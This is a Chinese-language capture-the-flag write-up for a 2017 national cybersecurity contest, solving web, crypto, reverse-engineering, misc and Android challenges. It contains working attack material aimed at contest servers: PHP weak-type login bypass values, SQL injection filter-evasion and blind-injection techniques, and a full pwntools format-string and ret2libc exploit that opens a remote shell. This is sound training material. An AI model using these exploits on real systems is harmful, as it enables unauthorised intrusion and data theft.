---
title: 第三届全国网络空间安全技术大赛(线上初赛)
---
# 第三届全国网络空间安全技术大赛(线上初赛)

##web 1 签到题
1.老套路看源码发现是php隐士转换直接 `Username=QNKCDZO，password=240610708` ，得到下一个地址http://117.34.111.15:84/json.php
2.继续右键看源码
![](http://i.imgur.com/uzIyIK5.png)



3.又是弱类型

![](http://i2.muimg.com/567571/0e5913ddf22456cc.png)

# Web2 抽抽奖

> 抽奖呗 http://117.34.111.15/

看到 `jQuery.js` 有点异常，打开源码，[解码](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)得到以下代码：



![](http://i4.buimg.com/567571/cc3bda86da260b92.png)

然后直接在控制台输入 `getFlag`，得到 `flag`

```js
(function() {
window.getFlag=function(text){  if(text=='1'){      alert("你最厉害啦!可惜没flag")  }   if(text=='2'){      alert("你太厉害了,竟然是二等奖")   }   if(text=='3'){      alert("你好厉害,三等奖啊")  }   if(text=='flag'){       alert("flag{951c712ac2c3e57053c43d80c0a9e543}")     }   if(text=='0'){      alert("再来一次吧")  } }
})
```
# Web3 继续抽

查看源代码，看代码

```js
$.get('get.php?token=' + $("#token").val() + "&id=" + encode(md5(jsctf2)), function(jsctf3) {
    alert(jsctf3['text'])
}, 'json');
```

于是构造请求 `'http://117.34.111.15:81/get.php?token='+token+'&id='+id` ，试了下 `encode(md5('1'))、encode(md5('2'))、encode(md5('3'))`，均没出来 `flag` ，于是写了 `python` 脚本，跑构造好的字典

```python
# -- coding:utf-8 --
import requests
import pyquery

file = open('zd.txt','r')

for line in file.readlines():
    id = line.strip('\n')
    url = 'http://117.34.111.15:81/'

    headers = {
        'Accept-Encoding': 'gzip, deflate, sdch, br',
        'Connection': 'keep-alive',
        'Cache-Control':'max-age=0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN',
        'Upgrade-Insecure-Requests':'1',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4',
    }

    s = requests.Session()

    r = s.get(url=url,headers=headers).text

    c = pyquery.PyQuery(r)

    token = c('#token').val()


    url2 = 'http://117.34.111.15:81/get.php?token='+token+'&id='+id

    r2 = s.get(url=url2,headers=headers)
    str = r2.text
    print str.decode('unicode_escape').encode('utf-8'), id
```

于是跑出 `flag`，也就是当 `encode(md5('147'))` 时，

![](http://i1.piimg.com/567571/08ff7a791dc14523.jpg)

# Web4  Wrong
找到这个 `.index.php.swp` 通过恢复文件 `vim -r index.php` 得到下面源码

![](http://i2.muimg.com/567571/911b3dc41578b3b1.png)


```php
<?php

error_reporting(0);
function create_password($pw_length =  10)
{
$randpwd = "";
for ($i = 0; $i < $pw_length; $i++)
{
$randpwd .= chr(mt_rand(33, 126));
}
return $randpwd;
}

session_start();
mt_srand(time());
$pwd=create_password();

if($pwd==$_GET['pwd'])
{
  if($_SESSION['userLogin']==$_GET['login'])
    echo "Good job, you get the key";
}
else
{echo "Wrong!";}

$_SESSION['userLogin']=create_password(32).rand();
?>
```
通过小小的审计得到思路 把cookie删掉
就可以过第二个 `if($_SESSION['userLogin']==$_GET['login'])`

```php
<?php
function create_password($pw_length =  10)
{
    $randpwd = "";
    for ($i = 0; $i < $pw_length; $i++)
    {
        $randpwd .= chr(mt_rand(33, 126));
    }

    return $randpwd;
}

mt_srand(1492307701);
$pwd=create_password();
var_dump($pwd);
?>

```

通过下面脚本得到一个随后的时间戳，用 `burp` 不断发包，等到时间到了设置的时间戳就会得到 `flag`

##web4 so easy:
访问:`http://117.34.111.15:89/` 得到部分源码

![](http://i.imgur.com/2MLmzn8.png)

1. waf拦截了`逗号、空格、and、union`等关键字，但是没有过滤`mid、ascii、from等关键字`，因为过滤了and，那就利用Mysql的位运算`0'^1^'1`结果为0，拼接sql语句为`select role from  user where username ='0'^1^0`成功得到查询到admin的role
2. 利用bool型盲注进行注入，用()代替空格，用from 1 代替,写一个脚本跑一下，得到密码: `37b1d2f04f594bfffc826fd69e389688`

    ![](http://i.imgur.com/CWEovXF.png)

3. 利用注入的密码去登录

    ![](http://i.imgur.com/g6oxtms.png)

4. 这里直接用mysql字符问题解决，成功获取flag

    ![](http://i.imgur.com/5R2rXH0.png)

##web5 just a test：
1.随手发现注入
直接sqlmap跑，开始一直在跑test1库，跑到后台管理账号密码，后台没有

2.列了一下数据库，看到了test库，想到题目才知道入坑了，但是跑不出来列得到列名为fl@g，尝试去跑内容，但是段都列不了，用尝试手工，成功获取到fl@g的列为f1ag(ps:坑就在@，mysql会把g当做变量，没办法查询，用反引号扩起来就好了)

![](http://i.imgur.com/ClmCCbs.png)

![](http://i.imgur.com/Xkcyt7V.png)

因为extractvalue有32位的限制，直接把f1ag加在sqlmap的列的目录里面，直接dump吧

![](http://i.imgur.com/pkyjJZN.png)

# Crypto1 签到

```bash
 ~ echo "ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30=" | base64 -D
flag{WeiSuoFyu_BieLang}
```

# Crypt2 200
小强不小心截获了两个老外同服务器的加密通信数据，看看他们在说些什么。。。

在通信流量中能找到 N 和E，猜测密文都是一样的，用共模攻击
得到 `flag{flag{Hc0mm0nModulusR$AH}}`

# Bin1 Now
程序使用自修改代码、第三方标准库等手段，影响静态分析。程序输入在`00402047`处，接着在`004020E9`检查长度是否为9。通过`004038F0`输出调用定位到关键输出在`00402490`函数中，此控制此函数关键之跳的`dword_446184`是在`402640`函数中确定的。细看下此函数，发现关键算法也在此处，将输入和`xmmword_43AC00`分别运算后进行比较，因为`xmmword_43AC00`的计算结果为定值，整理下即可反算出输入`536724689`，代码如下。

```python
check = [0x0b,0x06,0x15,0x0b,0x04,0x0e,0x16,0x10,0x31]
input = ''
for i in range(3):
	s2 = check[3*i+1]/2
	s1 = check[3*i]-2*s2
	s3 = check[3*i+2]-5*s2
	input += chr(s1+0x30)+chr(s2+0x30)+chr(s3+0x30)
print input
```

将输入代入程序即可得到后面一部分的flag：`0IdWan9}`
根据题目提示，终于在文件的详细资料里找到一串base64串，解之得到`flag{aoot@mail:`。
所以最终flag:`flag{aoot@mail:0IdWan9}`。

# Bin2 Magical Box

```python
# -*-coding:utf-8-*-

from pwn import *

context.log_level = "debug"

r = remote("117.34.80.134", 7777)

def leak(addr):
    r.recvuntil("you?\n")
    payload = "aa" + p32(addr) + "%5$s"
    r.sendline(payload)
    r.recvuntil("login!aa")
    r.recv(4)
    data = r.recvuntil("\n")
    data = data.replace("\n","")
    return data

def leak_canary():
    r.recvuntil("you?\n")
    payload = "%7$p"
    r.sendline(payload)
    r.recvuntil("login!")
    data = r.recvuntil("\n")
    data = data.replace("\n", "")
    return data

canary = int(leak_canary(),16)
print "[*] canary:{0}".format(hex(canary))

printf_got = 0x0804B010
leak_data = leak(printf_got)
printf_addr = u32(leak_data[0:4])
fflush_addr = u32(leak_data[4:8])
print "[*] printf:{0}".format(hex(printf_addr))
print "[*] fflush:{0}".format(hex(fflush_addr))
libc = ELF("./libc.so.6")
libc_base = printf_addr - libc.symbols["printf"]
system_addr = libc_base + libc.symbols["system"]
sh_addr = next(libc.search("/bin/sh")) + libc_base
#attach()
r.recvuntil("you?\n")
r.sendline("admin2017")
r.recvuntil("commands.")
r.sendline("add")
r.recvuntil("APP/Site: ")
r.sendline("a"*0x31)
r.recvuntil("Username: ")
r.sendline("b"*0x1d)
r.recvuntil("Password: ")
payload = "a"*30
payload += p32(canary)
payload += "a"*0xc
payload += p32(system_addr)
payload += p32(sh_addr)
payload += p32(sh_addr)
r.sendline(payload)

r.interactive()
```

# Misc1 一维码
首先，从图片中进行 `LSB` 提取，能获取一个 `ELF` 文件。

![](http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png)

又因为之前扫码得知一个针对可执行文件的隐写工具hydan，通过这个就能得到flag了。

# Misc3乾坤
在数据包导出http对象，里面有2个zip包（在linux下可以看得清楚），解压后一个是flag.exe另一个是encode.py，encode.py是把flag进行多次b64替换并做处理，而flag.exe在最后面附带了密文，编写decode.py即可

`flag{n1_hEn_baNg_0}`

# Misc4 轨迹
USB流量捕获与解析，之前在360安全客看到过类似的题目，我记得好像还是XNUCA Misc专场的题。猜测又是画flag了，祭出我的神器！（当然也不是我的是github上的大神写的）[https://github.com/gloxec/UsbMiceDataHacker](https://github.com/gloxec/UsbMiceDataHacker)

![](http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png)


经过一番艰难的识别。。。。

# Misc5 种棵树吧

对第一个图片斌walk 得到一个gif，加上头，能得到 In-order ` {RY!heHVaL-goAI{dxj_GpnUw8}kzu*Er:s56fFl2i}`
strings 第二个图片得到  Post-order`{YR!eVa-gLAoxd_j{pw}8zkUnGuIHh:r65f2lFsEi*}`
二叉树就二叉树吗 ...真是的
由中序和后序画出二叉树，然后按层次遍历 得到hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}

# Misc6 我们的秘密

对文件进行`binwak secret.zip -e`得到一个reame.txt文件，使用明文攻击，得到压缩包密码：3xatu2o17
解压后主要有两文件，一个音频，一个视频，音频中解摩尔斯得到CTFSECWAR2017，然后猜测题目的意思，our secret这是一款隐写软件，通过他和之前得到的字符串得到`flag{v1de0_c0nc3a1_lala}`

![](http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png)


# MOBILE1 拯救鲁班七号
题目对输入的字符串进行简单的变换，每个循环中，首先将当前index指向的相邻两个字符互换，然后将进入一个小循环依次每隔3个互换。加解密时需注意互换的边界。密文为“!S#@A4DF32511@43”，明文为“!@#@ASDF3451123”。
加解密代码：

```python
s = '!@#@ASDF34511234'
print len(s)
l = list(s)
for i in range(1, len(l) - 1, 2):
    l[i], l[i - 1] = l[i - 1], l[i]
    for j in range(4, len(l), 4):
        l[j - 4], l[j] = l[j], l[j - 4]

print l
print ''.join(l)

# s = 'S!@#@1FD23154A34'
# l = list(s)

for i in range(((len(l) & (~1)) - 3), 0, -2):
    for j in range((len(l) - 1) & (~3), 3, -4):
        l[j - 4], l[j] = l[j], l[j - 4]
    l[i], l[i - 1] = l[i - 1], l[i]

print l
print ''.join(l)
print ''.join(l) == s
```

# MOBILE 2 人民的名义-抓捕赵德汉1
首先从sqlite数据库里取一个字符串，id为2，表为users，取出来字符串为9838e888496bfda98afdbb98a9b9a9d9cdfa29，然后会将输入做一些变换与字符串比较，变换的规则为每个字符的低四位取反并转为十六进制，然后加上高四位与0xe异或。

```python
s = '9838e888496bfda98afdbb98a9b9a9d9cdfa29'
l = []
for i in range(0, len(s), 2):
    l.append(chr(
        (~int(s[i], 16) & 0xf) + ((int(s[i + 1], 16) ^ 0xe) << 4)
    ))
print l
print ''.join(l)
```

# MOBILE 3 人民的名义-抓捕赵德汉2
这个题有两种解法，第一种反编译newClassName.class，里面有个md5：`fa3733c647dca53a66cf8df953c2d539` ，cmd5上查一下是monkey99就是flag。
第二种正统的做法，是反编译CheckPassword.class，发现里面动态加载了一个class，这个class使用aes加密存于ClassEnc文件中，aes密钥的十六进制是`bb27630cf264f8567d185008c10c3f96` ，把这个ClassEnc文件解密，即可得到newClassName.class文件的内容，后面的步骤同第一个解法

# MOBILE 4 The Marauder's Map
本题使用双字节混淆，众所周知java是支持双字节变量名的，也就是说你可以起中文的变量名，这并不影响编译，因此可以直接反编译class代码，然后直接重新编译运行就好了。
这个题使用的是自己的system类，因此要注意不要和系统的system类弄混了。
这个题首先由一个复杂的字符串每个字符右移一位生成一个密钥，然后遍历输入，计算当前索引的斐波那契数列的值，作为对密钥的索引，然后拼接起来就是目标flag。
这里密钥的获取只能用java来实现，其余可以用Python来实现。
代码

```java
public static String getKey() {
   String x = "";
   char[] var5;
   int var4 = (var5 = "vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬".toCharArray()).length;

   for(int var3 = 0; var3 < var4; ++var3) {
      char $ = var5[var3];
      x = x + (char)(($ >> 1) + 15);
   }

   return x;
}
```

```python
# coding=utf-8

def f(i):
    return f(i - 1) + f(i - 2) if i > 2 else 1


def d(i, s):
    return f(i) % len(s)
key = "JsnatterrtJuaththovacke"
l = []

i = 0
for _ in range(4):
    for k in range(4):
        l.append(key[d(i + k, key)])
    l.append('-')
    i += 5
print ''.join(l)[:-1]
```

# MOBILE 5 取证密码
本题lib中有一个字符串和一个整数数组，只要按整数数组里的顺序从字符串中取出字符，拼接起来就是flag
代码

```python
key = 'yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W'
l = [0x39, 0x20, 7, 0xA, 0x20, 0x29, 0x13, 2, 0x3A, 0xC, 0x11, 0x31, 0x3B, 0xB, 7]

s = []
for i in l:
    s.append(key[i])
print ''.join(s)
```

![](http://i2.muimg.com/567571/1503017cb0e6341b.png)
